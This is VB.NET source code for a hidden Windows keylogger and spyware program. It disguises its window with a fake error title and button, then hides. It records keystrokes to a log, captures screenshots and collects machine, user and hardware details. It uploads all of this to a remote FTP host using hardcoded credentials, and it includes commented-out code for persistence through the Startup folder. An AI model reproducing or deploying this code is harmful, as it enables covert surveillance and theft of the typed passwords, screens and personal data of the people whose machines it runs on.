Option Strict On

Imports Limilabs.FTP.Client
Imports System.Text

Public Class frmMain

    ' Variable Server FTP
    Public ftp_user As String = "alex"
    Public ftp_password As String = "admin123"
    Public ftp_serverip As String = "localhost"
    Public ftp_port As Integer = "21"
    Public ftp_folder As String = System.Environment.UserName
    Public ftp_message As String

    Public ftp_ip_folder As String = "public_html"
    Public ftp_ip_user As String = "alex"
    Public ftp_ip_password As String = "admin123"
    Public ftp_ip_serverip As String = "synckey.hostoi.com"

    Public dev As Integer = "1"

    ' Variable Local Folder
    Public local_folder As String = "c:\users\public\" + System.Environment.UserName
    Public local_log_path As String = local_folder + "\log_" + Now.Date.ToString("MMM_d_yyyy") + ".txt"
    Public local_infolog_path As String = local_folder + "\infolog_" + Now.Date.ToString("MMM_d_yyyy") + ".txt"

    ' Event "Form1" #LOAD - When Load a Form
    ' - 1. Detecting FTP IP
    ' - 2. Create/Check Local Folder
    ' - 3. Change Title of Form1
    ' - 4. Open Registry Local Log
    ' - 5. Initializate Timers
    ' - 6. Hide Form1
    Private Sub frmMain_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        ' - 1. Detecting FTP IP
        Dim client As New Ftp()
        Try
            client.Connect(ftp_ip_serverip) ' connect server
            client.Login(ftp_ip_user, ftp_ip_password)
            client.ChangeFolder(ftp_ip_folder) ' change folder logs
            client.Download("/" + ftp_ip_folder + "/ip.txt", local_folder + "\ip.txt")
            If (dev = 1) Then
                MsgBox("Welcome Alex" + vbNewLine + "Log Path: " + local_log_path + vbNewLine + "Info Log Path: " + local_infolog_path + vbNewLine + "Detected IP: " + My.Computer.FileSystem.ReadAllText(local_folder + "\ip.txt"))
            Else
                ftp_serverip = My.Computer.FileSystem.ReadAllText(local_folder + "\ip.txt")
            End If

        Catch ex As Exception
            MsgBox("ERROR: Cannot Detect FTP Server IP")
        End Try
        client.Close()
        ' - 2. Check/Create Local Folders
        If (Not System.IO.Directory.Exists(local_folder)) Then
            System.IO.Directory.CreateDirectory(local_folder)
        End If
        If (Not System.IO.File.Exists(local_infolog_path)) Then
            My.Computer.FileSystem.WriteAllText(local_infolog_path, "", False)
        ElseIf (Not System.IO.File.Exists(local_log_path)) Then
            My.Computer.FileSystem.WriteAllText(local_log_path, "", True)
        End If
        ' - 3. Change Title of Form1
        Me.Text = "ERROR 00x2B1B17" ' Change title of Form1
        ' - 4. Registry Open Local Log
        My.Computer.FileSystem.WriteAllText(local_log_path, vbNewLine & "----- Open at: " & Now & vbNewLine, True)
        ' - 5. Initializate Timers
        timerKeys.Enabled = True
        timerOnline.Enabled = True
        timerHide.Enabled = True
        ' - 6. Sync Online Information with Server
        ftp_message = "1"
        SyncServer(ftp_message, "online", ftp_serverip, ftp_port)

        ' X
        'Dim aFile As String = Application.ExecutablePath
        'Dim Split() As String = aFile.Split(CChar("/"))
        'Dim Filename As String = Split(UBound(Split))
        'Dim Path As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
        'MsgBox(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
        'System.IO.File.Move(aFile, Path & "/" & Filename)

        ' - 6. Hide frmMain
        Me.Hide()

    End Sub

    ' Event "Form1" #CLOSE - When close a Form
    ' - 1. Shutdow Timers
    ' - 2. Close Registry Local Log
    ' - 3. Sync local log with Server
    Private Sub frmMain_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        ' - 1. Shutdow Timers
        timerKeys.Enabled = False
        timerOnline.Enabled = False
        timerHide.Enabled = False
        ' - 2. Registry Close in Local Log
        My.Computer.FileSystem.WriteAllText(local_log_path, vbNewLine & "----- Closed at: " & Now & vbNewLine, True)
        ' - 3. Sync Information Local Log with Server
        ftp_message = My.Computer.FileSystem.ReadAllText(local_log_path) ' read message to upload on log server
        SyncServer(ftp_message, "logs", ftp_serverip, ftp_port) ' sync local log with server log
        ' - 4. Sync Offline Information with Server
        ftp_message = "0"
        SyncServer(ftp_message, "online", ftp_serverip, ftp_port)

        
    End Sub

    ' Timer "timerKeys" - Registry Keys Pressed in Local Log
    ' - 1. Detect Keys Pressed and Registry in Local Log
    Private Sub timerKeys_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timerKeys.Tick
        mdlKeyboard.SyncKeyboard(local_log_path)
    End Sub

    ' Timer "timerHide" - check SECRET Key to show Forms
    ' - 1. Detect SECRET Key to show frmMain
    Private Sub timerHide_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timerHide.Tick
        ' If CTRL + ALT + K mostra o formulario 1
        If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.AltKeyDown AndAlso mdlKeyboard.letter = "K" Then
            Me.Show() ' show Form1
        End If
    End Sub

    ' Timer "timerOnline" - update online real-realtime Info from Local Computer
    ' - 1. Write Info Log
    ' - 2. Read Local Info Log
    ' - 3. Sync Local Info Log with Server
    ' - 4. Sync Online Information with Server
    Private Sub timerOnline_Tick(sender As Object, e As EventArgs) Handles timerOnline.Tick
        ' - 1. Fazer escrita no Info Log
        SyncInfo()
        ' - 2. Leitura do ficheiro Info Log
        ftp_message = My.Computer.FileSystem.ReadAllText(local_infolog_path)
        ' - 3. Sync Information Local Info Log with Server
        SyncServer(ftp_message, "info", ftp_serverip, ftp_port)
        ' - 4. Sync Online Information with Server
        ftp_message = "1"
        SyncServer(ftp_message, "online", ftp_serverip, ftp_port)

        ' Teste
        Dim bounds As Rectangle
        Dim screenshot As System.Drawing.Bitmap
        Dim graph As Graphics
        bounds = Screen.PrimaryScreen.Bounds
        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
        graph = Graphics.FromImage(screenshot)
        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
        screenshot.Save(local_folder + "\screen.bmp")

        Dim client As New Ftp()
        client.Connect(ftp_ip_serverip) ' connect server
        client.Login(ftp_ip_user, ftp_ip_password)
        client.Upload("/info/" + ftp_folder + "/screen.bmp", local_folder + "\screen.bmp")
        client.Close()

    End Sub

    ' Event "bntFakeOK" #CLICK - When Click on Button
    ' - 1. Hide Form1
    Private Sub btnFakeOK_Click(sender As Object, e As EventArgs) Handles btnFakeOK.Click
        Me.Hide()
    End Sub

    ' Method "SyncServer": Sync a message with FTP Server
    ' @params message (String): Message to upload
    ' @params type (String): Type of message (logs/info/online)
    ' @params ip (String): IP of FTP Server
    ' @params port (Integer): Port of FTP Server
    ' - 1. Create FTP Cliand and Connect to FTP Server
    ' - 2. Check/Create FTP Folder
    ' - 3. Find Local Log and upload it
    ' - 4. Close FTP Client
    Public Sub SyncServer(message As String, type As String, ip As String, port As Integer)
        ' - 1. Create FTP Cliand and Connect to FTP Server
        Dim client As New Ftp() ' new client FTP
        Try
            client.Connect(ftp_serverip) ' connect server
            client.Login(ftp_user, ftp_password) ' login client to server
            ' - 2. Check/Create FTP Folder
            If (type.Equals("logs")) Then
                client.ChangeFolder("logs") ' change folder logs
                Try ' check if "ftp_folder" exists, if not create one
                    client.ChangeFolder(ftp_folder)
                Catch ex As Exception
                    client.CreateFolder(ftp_folder)
                    client.ChangeFolder(ftp_folder)
                End Try
            ElseIf (type.Equals("info")) Then
                client.ChangeFolder("info") ' change folder info
                Try ' check if "ftp_folder" exists, if not create one
                    client.ChangeFolder(ftp_folder)
                Catch ex As Exception
                    client.CreateFolder(ftp_folder)
                    client.ChangeFolder(ftp_folder)
                End Try
            ElseIf (type.Equals("online")) Then
                client.ChangeFolder("info") ' change folder info
                Try ' check if "ftp_folder" exists, if not create one
                    client.ChangeFolder(ftp_folder)
                Catch ex As Exception
                    client.CreateFolder(ftp_folder)
                    client.ChangeFolder(ftp_folder)
                End Try
            End If
            ' - 3. Find Local Log and upload it
            If (type.Equals("online")) Then
                Dim d As Byte() = Encoding.[Default].GetBytes(message)
                client.Upload("online.txt", d)
            Else
                Dim data As Byte() = Encoding.[Default].GetBytes(message)
                client.Upload(Now.Date.ToString("MMM_d_yyyy") + "_message.txt", data)
            End If
        Catch ex As Exception
            MsgBox("ERROR: Server Problem")
        End Try
        ' - 4. Close FTP Client
        client.Close()

    End Sub

    ' Method "SyncInfo": Write Local Info Log
    ' - 1. Open Info Log
    ' - 2. Write Info Log
    ' - 3. Close Info Log
    Public Sub SyncInfo()
        ' - 1. Open Info Log
        My.Computer.FileSystem.WriteAllText(local_infolog_path, "X" & " " & "OpAT: " & Now & vbNewLine, False)
        ' - 2. Write Info Log
        My.Computer.FileSystem.WriteAllText(local_infolog_path, "Machine Name: " & System.Environment.MachineName & vbNewLine & "User Name: " & System.Environment.UserName & vbNewLine & "OS Name: " & My.Computer.Info.OSFullName & vbNewLine & "OS Plataform: " & My.Computer.Info.OSPlatform & vbNewLine & "OS Version: " & My.Computer.Info.OSVersion & vbNewLine & "Processor Name: " & CStr(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CentralProcessor\0", "ProcessorNameString", Nothing)) & vbNewLine & "MB Model: " & CStr(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardProduct", Nothing)) & vbNewLine & "MB Manufacturer: " & CStr(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardManufacturer", Nothing)), True)
        ' - 3. Close Info Log
        My.Computer.FileSystem.WriteAllText(local_infolog_path, vbNewLine & "X" & " " & "ClAT: " & Now & vbNewLine, True)
    End Sub

End Class
